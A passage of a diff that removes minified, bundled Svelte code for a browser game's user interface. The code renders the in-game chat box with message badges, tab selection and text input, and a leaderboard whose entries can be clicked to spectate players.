-                            e = (0, x.ND4)("span"), A && A.c(), t = (0, x.xem)(), i = (0, x.Qq7)(s), n = (0, x.xem)(), r = (0, x.Qq7)(":"), (0, x.CFu)(e, "class", "message sender s-619hc6"), (0, x.CFu)(e, "style", a = "color:" + $[21].Yqh + ";" + ("#ffffff" === $[21].Yqh ? "" : "text-shadow: 0 0 3px " + $[21].Yqh + ";")), (0, x.CFu)(e, "data-pid", o = $[21].pid), (0, x.CFu)(e, "data-tip", "Click to spectate")
-                        },
-                        m(s, a) {
-                            (0, x.Yry)(s, e, a), A && A.m(e, null), (0, x.BCw)(e, t), (0, x.BCw)(e, i), (0, x.BCw)(e, n), (0, x.Yry)(s, r, a), l = !0, c || (h = (0, x.KTR)(e, "click", $[12]), c = !0)
-                        },
-                        p($, n) {
-                            $[21].badges ? A ? (A.p($, n), 8 & n && (0, x.c7F)(A, 1)) : ((A = g($)).c(), (0, x.c7F)(A, 1), A.m(e, t)) : A && ((0, x.V44)(), (0, x.Tn8)(A, 1, 1, () => {
-                                A = null
-                            }), (0, x.GYV)()), (!l || 8 & n) && s !== (s = $[21].from + "") && (0, x.iQh)(i, s), (!l || 8 & n && a !== (a = "color:" + $[21].Yqh + ";" + ("#ffffff" === $[21].Yqh ? "" : "text-shadow: 0 0 3px " + $[21].Yqh + ";"))) && (0, x.CFu)(e, "style", a), (!l || 8 & n && o !== (o = $[21].pid)) && (0, x.CFu)(e, "data-pid", o)
-                        },
-                        i($) {
-                            l || ((0, x.c7F)(A), l = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(A), l = !1
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(r)), A && A.d(), c = !1, h()
-                        }
-                    }
-                }
-
-                function d($) {
-                    let e, t, s, i, n, a = $[21].badges && m($),
-                        o = $[21].from && C($),
-                        r = $[21].from && p();
-                    return {
-                        c() {
-                            e = (0, x.ND4)("span"), a && a.c(), t = (0, x.xem)(), o && o.c(), s = (0, x.xem)(), r && r.c(), i = (0, x.Iex)(), (0, x.CFu)(e, "class", "message s-619hc6")
-                        },
-                        m($, l) {
-                            (0, x.Yry)($, e, l), a && a.m(e, null), (0, x.BCw)(e, t), o && o.m(e, null), (0, x.Yry)($, s, l), r && r.m($, l), (0, x.Yry)($, i, l), n = !0
-                        },
-                        p($, s) {
-                            $[21].badges ? a ? (a.p($, s), 8 & s && (0, x.c7F)(a, 1)) : ((a = m($)).c(), (0, x.c7F)(a, 1), a.m(e, t)) : a && ((0, x.V44)(), (0, x.Tn8)(a, 1, 1, () => {
-                                a = null
-                            }), (0, x.GYV)()), $[21].from ? o ? o.p($, s) : ((o = C($)).c(), o.m(e, null)) : o && (o.d(1), o = null), $[21].from ? r || ((r = p()).c(), r.m(i.parentNode, i)) : r && (r.d(1), r = null)
-                        },
-                        i($) {
-                            n || ((0, x.c7F)(a), n = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(a), n = !1
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(s), (0, x.YoD)(i)), a && a.d(), o && o.d(), r && r.d($)
-                        }
-                    }
-                }
-
-                function g($) {
-                    let e, t, s;
-                    return t = new r.A({
-                        props: {
-                            used: $[21].badges,
-                            height: 15
-                        }
-                    }), {
-                        c() {
-                            e = (0, x.ND4)("div"), (0, x.N0i)(t.$$.fragment), (0, x.CFu)(e, "class", "message-badges s-619hc6")
-                        },
-                        m($, i) {
-                            (0, x.Yry)($, e, i), (0, x.wSR)(t, e, null), s = !0
-                        },
-                        p($, e) {
-                            var x = {};
-                            8 & e && (x.used = $[21].badges), t.$set(x)
-                        },
-                        i($) {
-                            s || ((0, x.c7F)(t.$$.fragment, $), s = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(t.$$.fragment, $), s = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.Hbl)(t)
-                        }
-                    }
-                }
-
-                function m($) {
-                    let e, t, s;
-                    return t = new r.A({
-                        props: {
-                            used: $[21].badges,
-                            height: 15
-                        }
-                    }), {
-                        c() {
-                            e = (0, x.ND4)("div"), (0, x.N0i)(t.$$.fragment), (0, x.CFu)(e, "class", "message-badges s-619hc6")
-                        },
-                        m($, i) {
-                            (0, x.Yry)($, e, i), (0, x.wSR)(t, e, null), s = !0
-                        },
-                        p($, e) {
-                            var x = {};
-                            8 & e && (x.used = $[21].badges), t.$set(x)
-                        },
-                        i($) {
-                            s || ((0, x.c7F)(t.$$.fragment, $), s = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(t.$$.fragment, $), s = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.Hbl)(t)
-                        }
-                    }
-                }
-
-                function C($) {
-                    let e, t = $[21].from + "",
-                        s, i;
-                    return {
-                        c() {
-                            e = (0, x.Qq7)("["), s = (0, x.Qq7)(t), i = (0, x.Qq7)("]")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t), (0, x.Yry)($, s, t), (0, x.Yry)($, i, t)
-                        },
-                        p($, e) {
-                            8 & e && t !== (t = $[21].from + "") && (0, x.iQh)(s, t)
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(s), (0, x.YoD)(i))
-                        }
-                    }
-                }
-
-                function p() {
-                    let $;
-                    return {
-                        c() {
-                            $ = (0, x.Qq7)(":")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function f($) {
-                    let e, t, s, i, n = $[21].timeStamp + "",
-                        a, o, r, l, c, h, g, m, C = $[21].text + "",
-                        p, f, _, w = "number" == typeof $[21].ePG && A($),
-                        v = [d, u],
-                        b = [];
-
-                    function y($, e) {
-                        return (l = null == (l = 8 & e ? null : l) ? !!Number.isNaN($[21].pid) : l) ? 0 : $[21].from ? 1 : -1
-                    }
-                    return ~(c = y($, -1)) && (h = b[c] = v[c]($)), {
-                        c() {
-                            e = (0, x.ND4)("div"), w && w.c(), t = (0, x.xem)(), s = (0, x.ND4)("span"), i = (0, x.Qq7)("["), a = (0, x.Qq7)(n), o = (0, x.Qq7)("]"), r = (0, x.xem)(), h && h.c(), g = (0, x.xem)(), m = (0, x.ND4)("span"), p = (0, x.Qq7)(C), f = (0, x.xem)(), (0, x.hgi)(s, "color", $[21].DvN || "#818589"), (0, x.CFu)(s, "class", "message stamp s-619hc6"), (0, x.CFu)(m, "class", "message text s-619hc6"), (0, x.hgi)(m, "color", $[21].textColor), (0, x.CFu)(e, "class", "message s-619hc6")
-                        },
-                        m($, n) {
-                            (0, x.Yry)($, e, n), w && w.m(e, null), (0, x.BCw)(e, t), (0, x.BCw)(e, s), (0, x.BCw)(s, i), (0, x.BCw)(s, a), (0, x.BCw)(s, o), (0, x.BCw)(e, r), ~c && b[c].m(e, null), (0, x.BCw)(e, g), (0, x.BCw)(e, m), (0, x.BCw)(m, p), (0, x.BCw)(e, f), _ = !0
-                        },
-                        p($, i) {
-                            "number" == typeof $[21].ePG ? w ? w.p($, i) : ((w = A($)).c(), w.m(e, t)) : w && (w.d(1), w = null), (!_ || 8 & i) && n !== (n = $[21].timeStamp + "") && (0, x.iQh)(a, n), (!_ || 8 & i) && (0, x.hgi)(s, "color", $[21].DvN || "#818589");
-                            let o = c;
-                            (c = y($, i)) === o ? ~c && b[c].p($, i) : (h && ((0, x.V44)(), (0, x.Tn8)(b[o], 1, 1, () => {
-                                b[o] = null
-                            }), (0, x.GYV)()), ~c ? ((h = b[c]) ? h.p($, i) : (h = b[c] = v[c]($)).c(), (0, x.c7F)(h, 1), h.m(e, g)) : h = null), (!_ || 8 & i) && C !== (C = $[21].text + "") && (0, x.iQh)(p, C), (!_ || 8 & i) && (0, x.hgi)(m, "color", $[21].textColor)
-                        },
-                        i($) {
-                            _ || ((0, x.c7F)(h), _ = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(h), _ = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), w && w.d(), ~c && b[c].d()
-                        }
-                    }
-                }
-
-                function _($) {
-                    let e, t, s = (0, x.rv_)($[3]),
-                        i = [];
-                    for (let n = 0; n < s.length; n += 1) i[n] = f(h($, s, n));
-                    return {
-                        c() {
-                            for (let $ = 0; $ < i.length; $ += 1) i[$].c();
-                            e = (0, x.Iex)()
-                        },
-                        m($, s) {
-                            for (let n = 0; n < i.length; n += 1) i[n] && i[n].m($, s);
-                            (0, x.Yry)($, e, s), t = !0
-                        },
-                        p($, t) {
-                            if (4104 & t) {
-                                s = (0, x.rv_)($[3]);
-                                let n;
-                                for (n = 0; n < s.length; n += 1) {
-                                    var a, o = h($, s, n);
-                                    i[n] ? (i[n].p(o, t), (0, x.c7F)(i[n], 1)) : (i[n] = f(o), i[n].c(), (0, x.c7F)(i[n], 1), i[n].m(e.parentNode, e))
-                                }
-                                for ((0, x.V44)(), n = s.length; n < i.length; n += 1) a = n, (0, x.Tn8)(i[a], 1, 1, () => {
-                                    i[a] = null
-                                });
-                                (0, x.GYV)()
-                            }
-                        },
-                        i($) {
-                            if (!t) {
-                                for (let e = 0; e < s.length; e += 1)(0, x.c7F)(i[e]);
-                                t = !0
-                            }
-                        },
-                        o($) {
-                            i = i.filter(Boolean);
-                            for (let e = 0; e < i.length; e += 1)(0, x.Tn8)(i[e]);
-                            t = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.ppq)(i, $)
-                        }
-                    }
-                }
-
-                function w($) {
-                    let e, t, s, i, n, a, o, r, l;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("select"), t = (0, x.ND4)("option"), s = (0, x.Qq7)("Tab 1"), n = (0, x.ND4)("option"), a = (0, x.Qq7)("Tab 2"), t.disabled = i = !$[9][0], t.__value = "0", (0, x.Gvd)(t, t.__value), n.disabled = o = !$[9][1], n.__value = "1", (0, x.Gvd)(n, n.__value), (0, x.CFu)(e, "class", "tab-selection s-619hc6"), (0, x.CFu)(e, "name", "speaker"), void 0 === $[0] && (0, x.Dti)(() => $[15].call(e))
-                        },
-                        m(i, o) {
-                            (0, x.Yry)(i, e, o), (0, x.BCw)(e, t), (0, x.BCw)(t, s), (0, x.BCw)(e, n), (0, x.BCw)(n, a), (0, x.fs8)(e, $[0], !0), r || (l = (0, x.KTR)(e, "change", $[15]), r = !0)
-                        },
-                        p($, s) {
-                            512 & s && i !== (i = !$[9][0]) && (t.disabled = i), 512 & s && o !== (o = !$[9][1]) && (n.disabled = o), 1 & s && (0, x.fs8)(e, $[0])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), r = !1, l()
-                        }
-                    }
-                }
-                class v extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, r) {
-                            let l;
-                            n.Uk.view.addEventListener("mousedown", async $ => {
-                                await (0, c.io)(), h?.blur()
-                            });
-                            let h, A, u = async $ => {
-                                f && (await (0, c.io)(), !$ && 200 < Math.abs(A.scrollHeight - A.clientHeight - A.scrollTop) || r(2, A.scrollTop = A.scrollHeight, A))
-                            }, d = (s.A.on("osKiSw", () => h.focus()), []), g = !1, m = $ => {
-                                d.push($), 300 < d.length && d.shift(), r(4, g = !g), u(!1)
-                            }, C = {
-                                Yqh: "#99cdff",
-                                pid: NaN,
-                                badges: o.H.get("official")
-                            }, p = {
-                                Yqh: "#e1dedd",
-                                pid: NaN,
-                                badges: o.H.get("system")
-                            }, f = (s.A.on("QsoZPW", $ => {
-                                m(Object.assign({
-                                    text: $,
-                                    timeStamp: (0, a.rO)()
-                                }, C))
-                            }), s.A.on("cjyapb", ($, e) => {
-                                m(Object.assign({
-                                    text: $,
-                                    textColor: e,
-                                    timeStamp: (0, a.rO)()
-                                }, p))
-                            }), s.A.on("NExDkf", $ => {
-                                $.Yqh || ($.Yqh = "#ffffff"), $.textColor || ($.textColor = "#ffffff"), $.timeStamp || ($.timeStamp = (0, a.rO)()), m($)
-                            }), s.A.on("IickcJ", () => {
-                                r(3, d = [])
-                            }), !1), _ = i.A.get("showHud") && i.A.get("showChat"), w = i.A.get("hudScale"), v = i.A.get("chatHeight"), b = (s.A.on("uEBHda", $ => {
-                                r(5, f = $)
-                            }), i.A.on("zrVIMz", ($, e) => {
-                                "chatHeight" === $ ? r(8, v = e) : "showChat" === $ && i.A.get("showHud") ? r(6, _ = e) : "showHud" === $ ? r(6, _ = e && i.A.get("showChat")) : "hudScale" === $ && r(7, w = e)
-                            }), "0"), y = [!1, !1];
-                            return s.A.on("jPH", ($, e) => {
-                                e && !y[l] && (r(0, b = "" + $), r(10, l = $)), r(9, y[$] = e, y), r(9, y)
-                            }), e.$$.update = () => {
-                                1 & e.$$.dirty && r(10, l = +b)
-                            }, [b, h, A, d, g, f, _, w, v, y, l, $ => {
-                                "Enter" === $.key && (h.value?.trim() && (s.A.eWI[l].uot(h.value), r(1, h.value = "", h)), n.Uk.view.focus(), u(!0))
-                            }, $ => {
-                                var $ = $.target;
-                                $ && ($ = +$.dataset.pid) && s.A.kmM.Xiy($)
-                            }, function($) {
-                                x.Dnk[$ ? "unshift" : "push"](() => {
-                                    r(2, A = $)
-                                })
-                            }, function($) {
-                                x.Dnk[$ ? "unshift" : "push"](() => {
-                                    r(1, h = $)
-                                })
-                            }, function() {
-                                r(0, b = (0, x.Hw5)(this))
-                            }]
-                        }, function $(e) {
-                            let t, s, i, n = e[4],
-                                a, o, r, c, h, A = e[9],
-                                u, d, g, m, C = _(e),
-                                p = w(e);
-                            return {
-                                c() {
-                                    t = (0, x.ND4)("div"), s = (0, x.ND4)("div"), i = (0, x.ND4)("div"), C.c(), a = (0, x.xem)(), o = (0, x.ND4)("div"), r = (0, x.ND4)("input"), h = (0, x.xem)(), p.c(), (0, x.CFu)(i, "class", "message-list s-619hc6"), (0, x.CFu)(r, "class", "message-input s-619hc6"), (0, x.CFu)(r, "type", "text"), (0, x.CFu)(r, "spellcheck", "false"), (0, x.CFu)(r, "autocomplete", "off"), (0, x.CFu)(r, "maxlength", "100"), (0, x.CFu)(r, "tabindex", "-1"), (0, x.CFu)(r, "placeholder", c = "Enter message as tab " + (1 + e[10]) + "..."), (0, x.CFu)(o, "class", "inputs s-619hc6"), (0, x.CFu)(s, "class", "chatbox s-619hc6"), (0, x.hgi)(s, "height", e[8]), (0, x.CFu)(t, "class", "chat-container s-619hc6"), (0, x.hgi)(t, "transform", "scale(" + e[7] + ")"), (0, x.hgi)(t, "display", e[5] && e[6] ? "block" : "none")
-                                },
-                                m($, n) {
-                                    (0, x.Yry)($, t, n), (0, x.BCw)(t, s), (0, x.BCw)(s, i), C.m(i, null), e[13](i), (0, x.BCw)(s, a), (0, x.BCw)(s, o), (0, x.BCw)(o, r), e[14](r), (0, x.BCw)(o, h), p.m(o, null), d = !0, g || (m = (0, x.KTR)(r, "keydown", e[11]), g = !0)
-                                },
-                                p($, [e]) {
-                                    16 & e && (0, x.jXN)(n, n = $[4]) ? ((0, x.V44)(), (0, x.Tn8)(C, 1, 1, x.lQ1), (0, x.GYV)(), (C = _($)).c(), (0, x.c7F)(C, 1), C.m(i, null)) : C.p($, e), (!d || 1024 & e && c !== (c = "Enter message as tab " + (1 + $[10]) + "...")) && (0, x.CFu)(r, "placeholder", c), 512 & e && (0, x.jXN)(A, A = $[9]) ? (p.d(1), (p = w($)).c(), p.m(o, null)) : p.p($, e), (!d || 256 & e) && (0, x.hgi)(s, "height", $[8]), (!d || 128 & e) && (0, x.hgi)(t, "transform", "scale(" + $[7] + ")"), (!d || 96 & e) && (0, x.hgi)(t, "display", $[5] && $[6] ? "block" : "none")
-                                },
-                                i($) {
-                                    d || ((0, x.c7F)(C), $ && (0, x.Dti)(() => {
-                                        d && (u = u || (0, x.h86)(t, l.Rv, {
-                                            duration: 300
-                                        }, !0)).run(1)
-                                    }), d = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(C), $ && (u = u || (0, x.h86)(t, l.Rv, {
-                                        duration: 300
-                                    }, !1)).run(0), d = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), C.d($), e[13](null), e[14](null), p.d($), $ && u && u.end(), g = !1, m()
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let b = v
-            },
-            79305($, e, t) {
-                t.d(e, {
-                    A: () => w
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95195)),
-                    i = t(78225),
-                    n = t(83529),
-                    a = t(3854),
-                    o = t(95669);
-
-                function r($, e, t) {
-                    return ($ = $.slice())[11] = e[t], $[13] = t, $
-                }
-
-                function l($) {
-                    let e, t, s, i, n, a = $[5],
-                        r, l, c = C($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("div"), s = (0, x.Qq7)($[3]), i = (0, x.xem)(), n = (0, x.ND4)("div"), c.c(), (0, x.CFu)(t, "class", "leaderboard title s-mzwvqb"), (0, x.goL)(t, "hide", !$[4]), (0, x.CFu)(e, "class", "leaderboard-container s-mzwvqb"), (0, x.hgi)(e, "transform", "scale(" + $[2] + ")")
-                        },
-                        m($, a) {
-                            (0, x.Yry)($, e, a), (0, x.BCw)(e, t), (0, x.BCw)(t, s), (0, x.BCw)(e, i), (0, x.BCw)(e, n), c.m(n, null), l = !0
-                        },
-                        p($, i) {
-                            (!l || 8 & i) && (0, x.iQh)(s, $[3]), (!l || 16 & i) && (0, x.goL)(t, "hide", !$[4]), 32 & i && (0, x.jXN)(a, a = $[5]) ? ((0, x.V44)(), (0, x.Tn8)(c, 1, 1, x.lQ1), (0, x.GYV)(), (c = C($)).c(), (0, x.c7F)(c, 1), c.m(n, null)) : c.p($, i), (!l || 4 & i) && (0, x.hgi)(e, "transform", "scale(" + $[2] + ")")
-                        },
-                        i($) {
-                            l || ((0, x.c7F)(c), $ && (0, x.Dti)(() => {
-                                l && (r = r || (0, x.h86)(e, o.Rv, {
-                                    duration: 300
-                                }, !0)).run(1)
-                            }), l = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(c), $ && (r = r || (0, x.h86)(e, o.Rv, {
-                                duration: 300
-                            }, !1)).run(0), l = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), c.d($), $ && r && r.end()
-                        }
-                    }
-                }
-
-                function c($) {
-                    let e, t = $[11].position + "",
-                        s, i;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("span"), s = (0, x.Qq7)(t), i = (0, x.Qq7)("."), (0, x.CFu)(e, "class", "leaderboard entry-position s-mzwvqb")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t), (0, x.BCw)(e, s), (0, x.BCw)(e, i)
-                        },
-                        p($, e) {
-                            64 & e && t !== (t = $[11].position + "") && (0, x.iQh)(s, t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function h($) {
-                    let e, t;
-                    return e = new a.A({
-                        props: {
-                            used: $[11].badges,
-                            height: 18,
-                            style: "margin-top:3px;position:absolute;inset:0;margin-left:" + (p ? 24 : 16) + "px;"
-                        }
-                    }), {
-                        c() {
-                            (0, x.N0i)(e.$$.fragment)
-                        },
-                        m($, s) {
-                            (0, x.wSR)(e, $, s), t = !0
-                        },
-                        p($, t) {
-                            var x = {};
-                            64 & t && (x.used = $[11].badges), e.$set(x)
-                        },
-                        i($) {
-                            t || ((0, x.c7F)(e.$$.fragment, $), t = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(e.$$.fragment, $), t = !1
-                        },
-                        d($) {
-                            (0, x.Hbl)(e, $)
-                        }
-                    }
-                }
-
-                function A($) {
-                    let e, t, s = $[11].badges && h($);
-                    return {
-                        c() {
-                            s && s.c(), e = (0, x.Iex)()
-                        },
-                        m($, i) {
-                            s && s.m($, i), (0, x.Yry)($, e, i), t = !0
-                        },
-                        p($, t) {
-                            $[11].badges ? s ? (s.p($, t), 64 & t && (0, x.c7F)(s, 1)) : ((s = h($)).c(), (0, x.c7F)(s, 1), s.m(e.parentNode, e)) : s && ((0, x.V44)(), (0, x.Tn8)(s, 1, 1, () => {
-                                s = null
-                            }), (0, x.GYV)())
-                        },
-                        i($) {
-                            t || ((0, x.c7F)(s), t = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(s), t = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), s && s.d($)
-                        }
-                    }
-                }
-
-                function u($) {
-                    let e, t = $[11].text + "",
-                        s, i;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("a"), s = (0, x.Qq7)(t), (0, x.CFu)(e, "href", i = $[11].link), (0, x.CFu)(e, "target", "_blank"), (0, x.CFu)(e, "rel", "noopener"), (0, x.CFu)(e, "class", "s-mzwvqb")
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t), (0, x.BCw)(e, s)
-                        },
-                        p($, n) {
-                            64 & n && t !== (t = $[11].text + "") && (0, x.iQh)(s, t), 64 & n && i !== (i = $[11].link) && (0, x.CFu)(e, "href", i)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function d($) {
-                    let e = $[11].text + "",
-                        t;
-                    return {
-                        c() {
-                            t = (0, x.Qq7)(e)
-                        },
-                        m($, e) {
-                            (0, x.Yry)($, t, e)
-                        },
-                        p($, s) {
-                            64 & s && e !== (e = $[11].text + "") && (0, x.iQh)(t, e)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(t)
-                        }
-                    }
-                }
-
-                function g($) {
-                    let e, t;
-
-                    function s($) {
-                        return $[11].link ? u : d
-                    }
-                    let i = s($),
-                        n = i($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("span"), n.c(), (0, x.CFu)(e, "class", "leaderboard entry-text s-mzwvqb"), (0, x.CFu)(e, "style", t = "color:" + $[11].color + ";" + ("#ffffff" === $[11].color ? "" : "text-shadow:0 0 3px " + $[11].color + ";") + "font-weight:" + ($[11].bold ? "bold" : "normal"))
-                        },
-                        m($, t) {
-                            (0, x.Yry)($, e, t), n.m(e, null)
-                        },
-                        p($, a) {
-                            i === (i = s($)) && n ? n.p($, a) : (n.d(1), (n = i($)) && (n.c(), n.m(e, null))), 64 & a && t !== (t = "color:" + $[11].color + ";" + ("#ffffff" === $[11].color ? "" : "text-shadow:0 0 3px " + $[11].color + ";") + "font-weight:" + ($[11].bold ? "bold" : "normal")) && (0, x.CFu)(e, "style", t)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), n.d()
-                        }
-                    }
-                }
-
-                function m($) {
-                    let e, t, s = $[5],
-                        i, n = $[5],
-                        a, o, r, l, h, u, d, m = p && $[11].position && c($),
-                        C = A($),
-                        _ = g($);
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), m && m.c(), t = (0, x.xem)(), C.c(), i = (0, x.xem)(), _.c(), a = (0, x.xem)(), (0, x.CFu)(e, "class", "leaderboard entry s-mzwvqb"), (0, x.CFu)(e, "data-pid", o = $[11].pid), (0, x.CFu)(e, "data-key", r = $[13]), (0, x.CFu)(e, "data-tip", l = $[11].pid ? "Click to spectate player" : ""), (0, x.goL)(e, "custom", !$[11].pid)
-                        },
-                        m(s, n) {
-                            (0, x.Yry)(s, e, n), m && m.m(e, null), (0, x.BCw)(e, t), C.m(e, null), (0, x.BCw)(e, i), _.m(e, null), (0, x.BCw)(e, a), h = !0, u || (d = (0, x.KTR)(e, "click", function() {
-                                (0, x.Qk1)($[11].pid ? $[7] : f) && ($[11].pid ? $[7] : f).apply(this, arguments)
-                            }), u = !0)
-                        },
-                        p(r, u) {
-                            $ = r, p && $[11].position ? m ? m.p($, u) : ((m = c($)).c(), m.m(e, t)) : m && (m.d(1), m = null), 32 & u && (0, x.jXN)(s, s = $[5]) ? ((0, x.V44)(), (0, x.Tn8)(C, 1, 1, x.lQ1), (0, x.GYV)(), (C = A($)).c(), (0, x.c7F)(C, 1), C.m(e, i)) : C.p($, u), 32 & u && (0, x.jXN)(n, n = $[5]) ? (_.d(1), (_ = g($)).c(), _.m(e, a)) : _.p($, u), (!h || 64 & u && o !== (o = $[11].pid)) && (0, x.CFu)(e, "data-pid", o), (!h || 64 & u && l !== (l = $[11].pid ? "Click to spectate player" : "")) && (0, x.CFu)(e, "data-tip", l), (!h || 64 & u) && (0, x.goL)(e, "custom", !$[11].pid)
-                        },
-                        i($) {
-                            h || ((0, x.c7F)(C), h = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(C), h = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), m && m.d(), C.d($), _.d($), u = !1, d()
-                        }
-                    }
-                }
-
-                function C($) {
-                    let e, t, s = (0, x.rv_)($[6]),
-                        i = [];
-                    for (let n = 0; n < s.length; n += 1) i[n] = m(r($, s, n));
-                    return {
-                        c() {
-                            for (let $ = 0; $ < i.length; $ += 1) i[$].c();
-                            e = (0, x.Iex)()
-                        },
-                        m($, s) {
-                            for (let n = 0; n < i.length; n += 1) i[n] && i[n].m($, s);
-                            (0, x.Yry)($, e, s), t = !0
-                        },
-                        p($, t) {
-                            if (224 & t) {
-                                s = (0, x.rv_)($[6]);
-                                let n;
-                                for (n = 0; n < s.length; n += 1) {
-                                    var a, o = r($, s, n);
-                                    i[n] ? (i[n].p(o, t), (0, x.c7F)(i[n], 1)) : (i[n] = m(o), i[n].c(), (0, x.c7F)(i[n], 1), i[n].m(e.parentNode, e))
-                                }
-                                for ((0, x.V44)(), n = s.length; n < i.length; n += 1) a = n, (0, x.Tn8)(i[a], 1, 1, () => {
-                                    i[a] = null
-                                });
-                                (0, x.GYV)()
-                            }
-                        },
-                        i($) {
-                            if (!t) {
-                                for (let e = 0; e < s.length; e += 1)(0, x.c7F)(i[e]);
-                                t = !0
-                            }
-                        },
-                        o($) {
-                            i = i.filter(Boolean);
-                            for (let e = 0; e < i.length; e += 1)(0, x.Tn8)(i[e]);
-                            t = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.ppq)(i, $)
-                        }
-                    }
-                }
-                let p = !1,
-                    f = () => {};
-                class _ extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, x) {
-                            let a = !1,
-                                o = n.A.get("showHud") && n.A.get("showLeaderboard"),
-                                r = n.A.get("hudScale"),
-                                l = (n.A.on("zrVIMz", ($, e) => {
-                                    "showLeaderboard" === $ && n.A.get("showHud") ? x(1, o = e) : "showHud" === $ ? x(1, o = e && n.A.get("showLeaderboard")) : "hudScale" === $ && x(2, r = e)
-                                }), "Leaderboard"),
-                                c = !0,
-                                h = !1,
-                                A = [],
-                                u = new Map([
-                                    [0, "first"],
-                                    [1, "second"],
-                                    [2, "third"],
-                                    [3, "fourth"],
-                                    [4, "fifth"],
-                                    [5, "sixth"],
-                                    [6, "seventh"],
-                                    [7, "eighth"],
-                                    [8, "ninth"],
-                                    [9, "tenth"]
-                                ]);
-                            return new class {
-                                constructor() {
-                                    this.AfU = ($, e) => {
-                                        if (a && s.A.alive) {
-                                            if ($.some($ => i.A.pids.includes($.pid))) $ = $.map($ => {
-                                                var e;
-                                                return i.A.pids.includes($.pid) && (e = i.A.pids.findIndex(e => e === $.pid), e = s.A.scores[e]) && ($.text += " (" + s.A.Hdd(e) + ")"), $
-                                            });
-                                            else {
-                                                let t = "You";
-                                                var o = s.A.YIr;
-                                                o && (t += " (" + s.A.Hdd(o) + ")"), $.push({
-                                                    pid: s.A.SAd,
-                                                    text: t,
-                                                    color: "#ffffff",
-                                                    bold: !1
-                                                })
-                                            }
-                                        }
-                                        if (x(6, A = $), x(5, h = !h), e) x(3, l = e.text), x(4, c = e.visible);
-                                        else if (n.A.get("showServerName") && i.A.selectedServer) {
-                                            x(4, c = !0);
-                                            let r = i.A.selectedServer.region || "";
-                                            r && (r += " "), r += i.A.selectedServer.name || "Unknown server", x(3, l = r)
-                                        } else x(4, c = !0), x(3, l = "Leaderboard")
-                                    }, s.A.on("rBrwjl", $ => {
-                                        x(1, o = $)
-                                    }), s.A.on("lnBlYR", this.show.bind(this)), s.A.on("EnBeEu", this.hide.bind(this))
-                                }
-                                show() {
-                                    a || (s.A.on("OyTJwL", this.AfU), x(0, a = !0))
-                                }
-                                hide() {
-                                    a && (s.A.off("OyTJwL", this.AfU), x(5, h = !h), x(6, A = []), x(0, a = !1))
-                                }
-                            }, [a, o, r, l, c, h, A, $ => {
-                                let e = $.target,
-                                    t = 3;
-                                for (; !e.classList.contains("entry") && --t;) e = e.parentElement;
-                                var $ = +e.dataset.pid,
-                                    x = +e.dataset.key;
-                                "number" == typeof $ && "number" == typeof x && s.A.kmM.Xiy($, u.get(x) + " largest player")
-                            }]
-                        }, function $(e) {
-                            let t, s, i = e[0] && e[1] && l(e);
-                            return {
-                                c() {
-                                    i && i.c(), t = (0, x.Iex)()
-                                },
-                                m($, e) {
-                                    i && i.m($, e), (0, x.Yry)($, t, e), s = !0
-                                },
-                                p($, [e]) {
-                                    $[0] && $[1] ? i ? (i.p($, e), 3 & e && (0, x.c7F)(i, 1)) : ((i = l($)).c(), (0, x.c7F)(i, 1), i.m(t.parentNode, t)) : i && ((0, x.V44)(), (0, x.Tn8)(i, 1, 1, () => {
-                                        i = null
-                                    }), (0, x.GYV)())
-                                },
-                                i($) {
-                                    s || ((0, x.c7F)(i), s = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(i), s = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), i && i.d($)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let w = _
-            },
-            98685($, e, t) {
-                t.d(e, {
-                    A: () => p
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95195)),
-                    i = t(78225),
-                    n = t(83529),
